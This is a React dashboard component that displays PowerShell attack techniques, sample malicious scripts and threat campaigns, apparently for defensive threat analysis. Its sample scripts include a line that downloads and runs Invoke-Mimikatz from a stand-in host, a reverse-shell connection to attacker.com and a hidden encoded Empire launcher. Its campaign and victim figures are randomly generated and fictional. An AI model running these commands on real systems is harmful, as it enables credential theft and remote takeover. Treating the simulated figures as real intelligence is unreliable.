/**
 * PowerShell Attack Vectors Analysis
 * Comprehensive analysis of PowerShell-based attack techniques and vectors
 */

import React, { useState, useEffect, useMemo, useCallback } from 'react';
import {
  Box,
  Grid,
  Card,
  CardContent,
  Typography,
  Button,
  IconButton,
  Chip,
  Avatar,
  LinearProgress,
  Alert,
  Tooltip,
  useTheme,
  alpha,
  Paper,
  List,
  ListItem,
  ListItemText,
  ListItemIcon,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  TablePagination,
  TextField,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  CircularProgress,
  Tabs,
  Tab,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  Badge,
  Accordion,
  AccordionSummary,
  AccordionDetails,
} from '@mui/material';

import {
  Terminal,
  Security,
  Warning,
  Assessment,
  TrendingUp,
  Shield,
  BugReport,
  Visibility,
  Search,
  Refresh,
  OpenInNew,
  CheckCircle,  Error as ErrorIcon,
  Code,
  Computer,
  Memory,
  ExpandMore,
  PowerSettingsNew,
  Build,
  Settings,
  FileCopy,
  CloudDownload,
} from '@mui/icons-material';

// Interfaces
interface PowerShellVector {
  id: string;
  name: string;
  technique_category: 'execution' | 'persistence' | 'privilege_escalation' | 'defense_evasion' | 'credential_access' | 'discovery' | 'collection' | 'command_control' | 'exfiltration';
  powershell_version: 'v2' | 'v3' | 'v4' | 'v5' | 'v6' | 'v7' | 'core' | 'any';
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  attack_methods: string[];
  obfuscation_techniques: string[];
  evasion_capabilities: string[];
  execution_context: 'user' | 'admin' | 'system' | 'elevated';
  logging_bypass: boolean;
  amsi_bypass: boolean;
  clm_bypass: boolean;
  detection_difficulty: 'easy' | 'medium' | 'hard' | 'very_hard';
  payload_delivery: string[];
  persistence_methods: string[];
  data_extraction: string[];
  network_communication: string[];
  indicators_of_compromise: string[];
  mitigation_strategies: string[];
  real_world_examples: string[];
  mitre_techniques: string[];
  complexity_score: number;
  stealth_score: number;
  effectiveness_score: number;
  first_observed: Date;
  last_updated: Date;
  frequency_in_wild: number;
}

interface PowerShellScript {
  id: string;
  name: string;
  script_type: 'malicious' | 'tool' | 'framework' | 'living_off_land';
  purpose: string;
  script_content: string;
  obfuscated_variants: string[];
  detection_signatures: string[];
  behavioral_indicators: string[];
  command_line_indicators: string[];
  file_artifacts: string[];
  network_indicators: string[];
  registry_artifacts: string[];
  countermeasures: string[];
  attribution: string[];
  campaigns_used: string[];
}

interface PowerShellCampaign {
  id: string;
  name: string;
  actor_group: string;
  campaign_start: Date;
  campaign_end?: Date;
  target_sectors: string[];
  powershell_techniques_used: string[];
  victims_count: number;
  success_rate: number;
  primary_objectives: string[];
  powershell_versions_targeted: string[];
  evasion_methods_observed: string[];
  detection_rate: number;
  geographic_distribution: string[];
  attack_sophistication: 'basic' | 'intermediate' | 'advanced' | 'nation_state';
}

interface PowerShellMetrics {
  total_vectors: number;
  active_campaigns: number;
  high_severity_techniques: number;
  detection_coverage: number;
  amsi_bypass_techniques: number;
  logging_bypass_techniques: number;
  avg_complexity_score: number;
  avg_stealth_score: number;
  version_distribution: { [key: string]: number };
  category_distribution: { [key: string]: number };
}

const PowerShellAttackVectors: React.FC = () => {
  const theme = useTheme();
  
  // State management
  const [vectors, setVectors] = useState<PowerShellVector[]>([]);
  const [scripts, setScripts] = useState<PowerShellScript[]>([]);
  const [campaigns, setCampaigns] = useState<PowerShellCampaign[]>([]);
  const [metrics, setMetrics] = useState<PowerShellMetrics | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  
  // Selection states
  const [selectedVector, setSelectedVector] = useState<PowerShellVector | null>(null);
  const [selectedScript, setSelectedScript] = useState<PowerShellScript | null>(null);
  
  // UI states
  const [activeTab, setActiveTab] = useState(0);
  const [detailsOpen, setDetailsOpen] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterCategory, setFilterCategory] = useState<string>('all');
  const [filterVersion, setFilterVersion] = useState<string>('all');
  const [filterSeverity, setFilterSeverity] = useState<string>('all');
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(10);

  // Simulated data generation
  const generatePowerShellData = useCallback(() => {
    const categories = ['execution', 'persistence', 'privilege_escalation', 'defense_evasion', 'credential_access', 'discovery', 'collection', 'command_control', 'exfiltration'] as const;
    const versions = ['v2', 'v3', 'v4', 'v5', 'v6', 'v7', 'core', 'any'] as const;
    const severityLevels = ['low', 'medium', 'high', 'critical'] as const;
    const contexts = ['user', 'admin', 'system', 'elevated'] as const;

    // Generate PowerShell vectors
    const vectorData: PowerShellVector[] = [];
    for (let i = 0; i < 22; i++) {
      const category = categories[Math.floor(Math.random() * categories.length)];
      const version = versions[Math.floor(Math.random() * versions.length)];
      const severity = severityLevels[Math.floor(Math.random() * severityLevels.length)];
      const context = contexts[Math.floor(Math.random() * contexts.length)];
      
      vectorData.push({
        id: `vector-${i + 1}`,
        name: `PowerShell ${category.replace('_', ' ').toUpperCase()} Vector ${i + 1}`,
        technique_category: category,
        powershell_version: version,
        severity: severity as any,
        description: `Advanced PowerShell ${category} technique targeting Windows environments with sophisticated evasion capabilities`,
        attack_methods: [
          'Direct script execution',
          'Encoded command execution',
          'Reflective loading',
          'In-memory execution',
          'Fileless attack'
        ],
        obfuscation_techniques: [
          'Base64 encoding',
          'String concatenation',
          'Variable substitution',
          'Character encoding',
          'Compression obfuscation'
        ],
        evasion_capabilities: [
          'AMSI bypass',
          'Logging evasion',
          'CLM bypass',
          'Script block logging bypass',
          'ETW evasion'
        ],
        execution_context: context,
        logging_bypass: Math.random() > 0.4,
        amsi_bypass: Math.random() > 0.5,
        clm_bypass: Math.random() > 0.6,
        detection_difficulty: ['easy', 'medium', 'hard', 'very_hard'][Math.floor(Math.random() * 4)] as any,
        payload_delivery: [
          'Email attachment',
          'Web download',
          'USB drive',
          'Network share',
          'Registry storage'
        ],
        persistence_methods: [
          'Registry Run keys',
          'Scheduled tasks',
          'WMI events',
          'Service installation',
          'Startup folders'
        ],
        data_extraction: [
          'File exfiltration',
          'Registry extraction',
          'Memory dumping',
          'Screen capture',
          'Keylogging'
        ],
        network_communication: [
          'HTTP/HTTPS',
          'DNS tunneling',
          'ICMP',
          'Custom protocols',
          'Encrypted channels'
        ],
        indicators_of_compromise: [
          'Unusual PowerShell processes',
          'Encoded command lines',
          'Network connections',
          'File modifications',
          'Registry changes'
        ],
        mitigation_strategies: [
          'PowerShell constrained language mode',
          'Script block logging',
          'AMSI implementation',
          'Application whitelisting',
          'Network monitoring'
        ],
        real_world_examples: [
          'PowerShell Empire',
          'Cobalt Strike',
          'Invoke-Mimikatz',
          'PowerSploit',
          'Nishang'
        ],
        mitre_techniques: [
          'T1059.001',
          'T1055',
          'T1027',
          'T1562',
          'T1140'
        ],
        complexity_score: Math.floor(Math.random() * 10) + 1,
        stealth_score: Math.floor(Math.random() * 10) + 1,
        effectiveness_score: Math.floor(Math.random() * 10) + 1,
        first_observed: new Date(Date.now() - Math.random() * 1000 * 24 * 60 * 60 * 1000),
        last_updated: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000),
        frequency_in_wild: Math.floor(Math.random() * 100) + 10
      });
    }

    // Generate PowerShell scripts
    const scriptData: PowerShellScript[] = [];
    const scriptExamples = [
      {
        name: 'Invoke-Mimikatz',
        type: 'tool' as const,
        purpose: 'Credential dumping and password extraction',
        content: 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/Invoke-Mimikatz.ps1")'
      },
      {
        name: 'PowerShell Empire Agent',
        type: 'framework' as const,
        purpose: 'Post-exploitation framework for persistence and control',
        content: 'powershell -W Hidden -enc <base64_encoded_empire_agent>'
      },
      {
        name: 'Invoke-PowerShellTcp',
        type: 'malicious' as const,
        purpose: 'Reverse shell establishment',
        content: '$client = New-Object System.Net.Sockets.TCPClient("attacker.com",4444)'
      },
      {
        name: 'Get-Process Living off Land',
        type: 'living_off_land' as const,
        purpose: 'Process enumeration using legitimate commands',
        content: 'Get-Process | Where-Object {$_.ProcessName -like "*chrome*"}'
      }
    ];

    scriptExamples.forEach((scriptExample, index) => {
      scriptData.push({
        id: `script-${index + 1}`,
        name: scriptExample.name,
        script_type: scriptExample.type,
        purpose: scriptExample.purpose,
        script_content: scriptExample.content,
        obfuscated_variants: [
          'Base64 encoded version',
          'String concatenation obfuscation',
          'Variable substitution',
          'Character encoding manipulation'
        ],
        detection_signatures: [
          'YARA rule for script patterns',
          'Sigma rule for command execution',
          'Behavioral detection rules',
          'Network traffic signatures'
        ],
        behavioral_indicators: [
          'Unusual process creation',
          'Network connections to suspicious IPs',
          'Registry modifications',
          'File system changes'
        ],
        command_line_indicators: [
          'Encoded command execution',
          'Suspicious parameter combinations',
          'Hidden window execution',
          'Bypass execution policy'
        ],
        file_artifacts: [
          'Temporary script files',
          'Downloaded payloads',
          'Log file entries',
          'Prefetch artifacts'
        ],
        network_indicators: [
          'C2 communication patterns',
          'Data exfiltration traffic',
          'DNS tunneling activity',
          'Encrypted channel usage'
        ],
        registry_artifacts: [
          'Run key modifications',
          'PowerShell execution policy changes',
          'WMI event registrations',
          'Service installations'
        ],
        countermeasures: [
          'PowerShell logging enhancement',
          'AMSI integration',
          'Script execution restrictions',
          'Network monitoring',
          'Endpoint detection'
        ],
        attribution: [
          `APT-${Math.floor(Math.random() * 50) + 1}`,
          'Cybercriminal groups',
          'State-sponsored actors'
        ],
        campaigns_used: [
          'Operation PowerShell Storm',
          'Advanced Persistent PowerShell',
          'Fileless Malware Campaign'
        ]
      });
    });

    // Generate PowerShell campaigns
    const campaignData: PowerShellCampaign[] = [];
    for (let i = 0; i < 10; i++) {
      const startDate = new Date(Date.now() - Math.random() * 730 * 24 * 60 * 60 * 1000);
      
      campaignData.push({
        id: `campaign-${i + 1}`,
        name: `PowerShell Campaign ${i + 1}`,
        actor_group: `APT-${Math.floor(Math.random() * 50) + 1}`,
        campaign_start: startDate,
        campaign_end: Math.random() > 0.3 ? new Date(startDate.getTime() + Math.random() * 365 * 24 * 60 * 60 * 1000) : undefined,
        target_sectors: [
          'Finance',
          'Healthcare',
          'Government',
          'Technology',
          'Manufacturing'
        ].slice(0, Math.floor(Math.random() * 3) + 1),
        powershell_techniques_used: categories.slice(0, Math.floor(Math.random() * 4) + 1),
        victims_count: Math.floor(Math.random() * 10000) + 500,
        success_rate: Math.floor(Math.random() * 70) + 15,
        primary_objectives: [
          'Data theft',
          'Ransomware deployment',
          'Espionage',
          'Cryptocurrency mining',
          'Botnet recruitment'
        ].slice(0, Math.floor(Math.random() * 3) + 1),
        powershell_versions_targeted: versions.slice(0, Math.floor(Math.random() * 3) + 1),
        evasion_methods_observed: [
          'AMSI bypass',
          'Logging evasion',
          'CLM bypass',
          'ETW evasion',
          'Script obfuscation'
        ].slice(0, Math.floor(Math.random() * 4) + 1),
        detection_rate: Math.floor(Math.random() * 60) + 25,
        geographic_distribution: ['US', 'EU', 'APAC', 'Global'].slice(0, Math.floor(Math.random() * 3) + 1),
        attack_sophistication: ['basic', 'intermediate', 'advanced', 'nation_state'][Math.floor(Math.random() * 4)] as any
      });
    }

    // Generate metrics
    const versionDist = versions.reduce((acc, version) => {
      acc[version] = vectorData.filter(v => v.powershell_version === version).length;
      return acc;
    }, {} as { [key: string]: number });

    const categoryDist = categories.reduce((acc, category) => {
      acc[category] = vectorData.filter(v => v.technique_category === category).length;
      return acc;
    }, {} as { [key: string]: number });

    const metricsData: PowerShellMetrics = {
      total_vectors: vectorData.length,
      active_campaigns: campaignData.filter(c => !c.campaign_end).length,
      high_severity_techniques: vectorData.filter(v => v.severity === 'high' || v.severity === 'critical').length,
      detection_coverage: Math.floor(Math.random() * 25) + 65,
      amsi_bypass_techniques: vectorData.filter(v => v.amsi_bypass).length,
      logging_bypass_techniques: vectorData.filter(v => v.logging_bypass).length,
      avg_complexity_score: Math.floor(vectorData.reduce((sum, v) => sum + v.complexity_score, 0) / vectorData.length),
      avg_stealth_score: Math.floor(vectorData.reduce((sum, v) => sum + v.stealth_score, 0) / vectorData.length),
      version_distribution: versionDist,
      category_distribution: categoryDist
    };

    setVectors(vectorData);
    setScripts(scriptData);
    setCampaigns(campaignData);
    setMetrics(metricsData);
    setLoading(false);
  }, []);

  useEffect(() => {
    generatePowerShellData();
  }, [generatePowerShellData]);

  // Filtered data
  const filteredVectors = useMemo(() => {
    return vectors.filter(vector => {
      const matchesSearch = vector.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                           vector.description.toLowerCase().includes(searchTerm.toLowerCase());
      const matchesCategory = filterCategory === 'all' || vector.technique_category === filterCategory;
      const matchesVersion = filterVersion === 'all' || vector.powershell_version === filterVersion;
      const matchesSeverity = filterSeverity === 'all' || vector.severity === filterSeverity;
      
      return matchesSearch && matchesCategory && matchesVersion && matchesSeverity;
    });
  }, [vectors, searchTerm, filterCategory, filterVersion, filterSeverity]);

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return theme.palette.error.main;
      case 'high': return '#ff9800';
      case 'medium': return theme.palette.warning.main;
      case 'low': return theme.palette.success.main;
      default: return theme.palette.grey[500];
    }
  };

  const getCategoryIcon = (category: string) => {
    switch (category) {
      case 'execution': return <PlayArrow />;
      case 'persistence': return <Settings />;
      case 'privilege_escalation': return <TrendingUp />;
      case 'defense_evasion': return <Security />;
      case 'credential_access': return <Computer />;
      case 'discovery': return <Search />;
      case 'collection': return <FileCopy />;
      case 'command_control': return <CloudDownload />;
      case 'exfiltration': return <Assessment />;
      default: return <PowerSettingsNew />;
    }
  };

  // Render overview metrics
  const renderOverviewMetrics = () => (
    <Grid container spacing={3} sx={{ mb: 3 }}>
      {[
        { label: 'Total Vectors', value: metrics?.total_vectors || 0, icon: <PowerSettingsNew />, color: theme.palette.primary.main },
        { label: 'High Severity', value: metrics?.high_severity_techniques || 0, icon: <Warning />, color: theme.palette.error.main },
        { label: 'AMSI Bypasses', value: metrics?.amsi_bypass_techniques || 0, icon: <Shield />, color: theme.palette.warning.main },
        { label: 'Active Campaigns', value: metrics?.active_campaigns || 0, icon: <TrendingUp />, color: theme.palette.success.main }
      ].map((metric, index) => (
        <Grid item xs={12} sm={6} lg={3} key={index}>
          <Card>
            <CardContent>
              <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                <Box>
                  <Typography variant="h4" fontWeight="bold">
                    {metric.value}
                  </Typography>
                  <Typography variant="body2" color="textSecondary">
                    {metric.label}
                  </Typography>
                </Box>
                <Avatar sx={{ bgcolor: alpha(metric.color, 0.1), color: metric.color }}>
                  {metric.icon}
                </Avatar>
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  // Render vectors table
  const renderVectorsTable = () => (
    <TableContainer component={Paper}>
      <Table>
        <TableHead>
          <TableRow>
            <TableCell>Vector Name</TableCell>
            <TableCell>Category</TableCell>
            <TableCell>PS Version</TableCell>
            <TableCell>Severity</TableCell>
            <TableCell>Context</TableCell>
            <TableCell>AMSI Bypass</TableCell>
            <TableCell>Complexity</TableCell>
            <TableCell>Actions</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {filteredVectors
            .slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
            .map((vector) => (
              <TableRow key={vector.id} hover>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    {getCategoryIcon(vector.technique_category)}
                    <Typography variant="body2">{vector.name}</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <Chip size="small" label={vector.technique_category.replace('_', ' ')} />
                </TableCell>
                <TableCell>
                  <Chip size="small" label={vector.powershell_version} variant="outlined" />
                </TableCell>
                <TableCell>
                  <Chip
                    size="small"
                    label={vector.severity}
                    sx={{
                      bgcolor: alpha(getSeverityColor(vector.severity), 0.1),
                      color: getSeverityColor(vector.severity)
                    }}
                  />
                </TableCell>
                <TableCell>
                  <Chip
                    size="small"
                    label={vector.execution_context}
                    color={vector.execution_context === 'system' ? 'error' : 
                           vector.execution_context === 'admin' ? 'warning' : 'default'}
                  />
                </TableCell>
                <TableCell>
                  {vector.amsi_bypass ? (
                    <CheckCircle color="error" />
                  ) : (
                    <ErrorIcon color="success" />
                  )}
                </TableCell>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <LinearProgress
                      variant="determinate"
                      value={vector.complexity_score * 10}
                      sx={{ flexGrow: 1, height: 6, borderRadius: 3 }}
                      color={vector.complexity_score > 7 ? 'error' : vector.complexity_score > 4 ? 'warning' : 'success'}
                    />
                    <Typography variant="caption">{vector.complexity_score}/10</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <IconButton
                    size="small"
                    onClick={() => {
                      setSelectedVector(vector);
                      setDetailsOpen(true);
                    }}
                  >
                    <Visibility />
                  </IconButton>
                </TableCell>
              </TableRow>
            ))}
        </TableBody>
      </Table>
      <TablePagination
        component="div"
        count={filteredVectors.length}
        page={page}
        onPageChange={(_, newPage) => setPage(newPage)}
        rowsPerPage={rowsPerPage}
        onRowsPerPageChange={(event) => {
          setRowsPerPage(parseInt(event.target.value, 10));
          setPage(0);
        }}
      />
    </TableContainer>
  );

  // Render scripts
  const renderScripts = () => (
    <Grid container spacing={3}>
      {scripts.map((script) => (
        <Grid item xs={12} md={6} key={script.id}>
          <Card 
            sx={{ 
              cursor: 'pointer',
              transition: 'all 0.3s ease',
              '&:hover': {
                transform: 'translateY(-2px)',
                boxShadow: theme.shadows[4],
              }
            }}
            onClick={() => {
              setSelectedScript(script);
              setDetailsOpen(true);
            }}
          >
            <CardContent>
              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'start', mb: 2 }}>
                <Typography variant="h6" gutterBottom>
                  {script.name}
                </Typography>
                <Chip
                  size="small"
                  label={script.script_type.replace('_', ' ')}
                  color={script.script_type === 'malicious' ? 'error' : 
                         script.script_type === 'tool' ? 'warning' : 'default'}
                />
              </Box>
              <Typography variant="body2" color="textSecondary" gutterBottom>
                {script.purpose}
              </Typography>
              <Box sx={{ mb: 2, bgcolor: theme.palette.grey[100], p: 1, borderRadius: 1, maxHeight: 100, overflow: 'hidden' }}>
                <Typography variant="caption" fontFamily="monospace" sx={{ wordBreak: 'break-all' }}>
                  {script.script_content}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                {script.attribution.slice(0, 2).map((attr) => (
                  <Chip key={attr} size="small" label={attr} variant="outlined" />
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  // Render campaigns
  const renderCampaigns = () => (
    <Grid container spacing={3}>
      {campaigns.map((campaign) => (
        <Grid item xs={12} md={6} lg={4} key={campaign.id}>
          <Card>
            <CardContent>
              <Typography variant="h6" gutterBottom>
                {campaign.name}
              </Typography>
              <Typography variant="body2" color="textSecondary" gutterBottom>
                Actor: {campaign.actor_group}
              </Typography>
              <Box sx={{ mb: 2 }}>
                <Typography variant="caption" display="block">
                  Victims: {campaign.victims_count.toLocaleString()}
                </Typography>
                <Typography variant="caption" display="block">
                  Success Rate: {campaign.success_rate}%
                </Typography>
                <Typography variant="caption" display="block">
                  Detection Rate: {campaign.detection_rate}%
                </Typography>
                <Typography variant="caption" display="block">
                  Sophistication: {campaign.attack_sophistication}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mb: 1 }}>
                {campaign.powershell_techniques_used.slice(0, 2).map((technique) => (
                  <Chip key={technique} size="small" label={technique.replace('_', ' ')} />
                ))}
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                {campaign.evasion_methods_observed.slice(0, 2).map((method) => (
                  <Chip key={method} size="small" label={method} variant="outlined" />
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  if (loading) {
    return (
      <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: 400 }}>
        <CircularProgress />
      </Box>
    );
  }

  if (error) {
    return (
      <Alert severity="error" sx={{ m: 2 }}>
        {error}
      </Alert>
    );
  }

  return (
    <Box sx={{ p: 3 }}>
      <Box sx={{ mb: 3 }}>
        <Typography variant="h4" gutterBottom>
          PowerShell Attack Vectors
        </Typography>
        <Typography variant="body1" color="textSecondary">
          Comprehensive analysis of PowerShell-based attack techniques, evasion methods, and malicious usage patterns
        </Typography>
      </Box>

      {renderOverviewMetrics()}

      <Card sx={{ mb: 3 }}>
        <CardContent>
          <Box sx={{ display: 'flex', gap: 2, mb: 3, flexWrap: 'wrap' }}>
            <TextField
              size="small"
              placeholder="Search vectors..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              InputProps={{
                startAdornment: <Search />
              }}
              sx={{ minWidth: 200 }}
            />
            <FormControl size="small" sx={{ minWidth: 150 }}>
              <InputLabel>Category</InputLabel>
              <Select
                value={filterCategory}
                onChange={(e) => setFilterCategory(e.target.value)}
                label="Category"
              >
                <MenuItem value="all">All Categories</MenuItem>
                <MenuItem value="execution">Execution</MenuItem>
                <MenuItem value="persistence">Persistence</MenuItem>
                <MenuItem value="privilege_escalation">Privilege Escalation</MenuItem>
                <MenuItem value="defense_evasion">Defense Evasion</MenuItem>
                <MenuItem value="credential_access">Credential Access</MenuItem>
                <MenuItem value="discovery">Discovery</MenuItem>
                <MenuItem value="collection">Collection</MenuItem>
                <MenuItem value="command_control">Command & Control</MenuItem>
                <MenuItem value="exfiltration">Exfiltration</MenuItem>
              </Select>
            </FormControl>
            <FormControl size="small" sx={{ minWidth: 120 }}>
              <InputLabel>PS Version</InputLabel>
              <Select
                value={filterVersion}
                onChange={(e) => setFilterVersion(e.target.value)}
                label="PS Version"
              >
                <MenuItem value="all">All Versions</MenuItem>
                <MenuItem value="v2">v2</MenuItem>
                <MenuItem value="v3">v3</MenuItem>
                <MenuItem value="v4">v4</MenuItem>
                <MenuItem value="v5">v5</MenuItem>
                <MenuItem value="v6">v6</MenuItem>
                <MenuItem value="v7">v7</MenuItem>
                <MenuItem value="core">Core</MenuItem>
                <MenuItem value="any">Any</MenuItem>
              </Select>
            </FormControl>
            <FormControl size="small" sx={{ minWidth: 120 }}>
              <InputLabel>Severity</InputLabel>
              <Select
                value={filterSeverity}
                onChange={(e) => setFilterSeverity(e.target.value)}
                label="Severity"
              >
                <MenuItem value="all">All Severities</MenuItem>
                <MenuItem value="critical">Critical</MenuItem>
                <MenuItem value="high">High</MenuItem>
                <MenuItem value="medium">Medium</MenuItem>
                <MenuItem value="low">Low</MenuItem>
              </Select>
            </FormControl>
            <Button startIcon={<Refresh />} onClick={generatePowerShellData}>
              Refresh
            </Button>
          </Box>

          <Tabs value={activeTab} onChange={(_, newValue) => setActiveTab(newValue)} sx={{ mb: 3 }}>
            <Tab label="Attack Vectors" />
            <Tab label="Malicious Scripts" />
            <Tab label="Campaign Analysis" />
          </Tabs>

          {activeTab === 0 && renderVectorsTable()}
          {activeTab === 1 && renderScripts()}
          {activeTab === 2 && renderCampaigns()}
        </CardContent>
      </Card>

      {/* Details Dialog */}
      <Dialog
        open={detailsOpen}
        onClose={() => setDetailsOpen(false)}
        maxWidth="lg"
        fullWidth
      >
        <DialogTitle>
          {selectedVector?.name || selectedScript?.name}
        </DialogTitle>
        <DialogContent>
          {selectedVector && (
            <Grid container spacing={3}>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Vector Details
                  </Typography>
                  <Typography variant="body2" paragraph>
                    {selectedVector.description}
                  </Typography>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="caption" display="block">
                      Category: {selectedVector.technique_category}
                    </Typography>
                    <Typography variant="caption" display="block">
                      PowerShell Version: {selectedVector.powershell_version}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Execution Context: {selectedVector.execution_context}
                    </Typography>
                    <Typography variant="caption" display="block">
                      AMSI Bypass: {selectedVector.amsi_bypass ? 'Yes' : 'No'}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Logging Bypass: {selectedVector.logging_bypass ? 'Yes' : 'No'}
                    </Typography>
                  </Box>
                </Paper>
              </Grid>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Mitigation Strategies
                  </Typography>
                  <List dense>
                    {selectedVector.mitigation_strategies.map((strategy, index) => (
                      <ListItem key={index}>
                        <ListItemIcon>
                          <Shield />
                        </ListItemIcon>
                        <ListItemText primary={strategy} />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            </Grid>
          )}
          {selectedScript && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Script Analysis
                  </Typography>
                  <Typography variant="body2" paragraph>
                    Purpose: {selectedScript.purpose}
                  </Typography>
                  <Typography variant="h6" gutterBottom sx={{ mt: 2 }}>
                    Script Content
                  </Typography>
                  <Box sx={{ bgcolor: theme.palette.grey[100], p: 2, borderRadius: 1, mb: 2 }}>
                    <Typography variant="body2" fontFamily="monospace">
                      {selectedScript.script_content}
                    </Typography>
                  </Box>
                  <Typography variant="h6" gutterBottom>
                    Countermeasures
                  </Typography>
                  <List dense>
                    {selectedScript.countermeasures.slice(0, 5).map((countermeasure, index) => (
                      <ListItem key={index}>
                        <ListItemIcon>
                          <Shield />
                        </ListItemIcon>
                        <ListItemText primary={countermeasure} />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            </Grid>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setDetailsOpen(false)}>
            Close
          </Button>
          <Button
            variant="outlined"
            startIcon={<OpenInNew />}
            onClick={() => window.open('https://attack.mitre.org/techniques/T1059/001/', '_blank')}
          >
            MITRE T1059.001
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
};

export default PowerShellAttackVectors;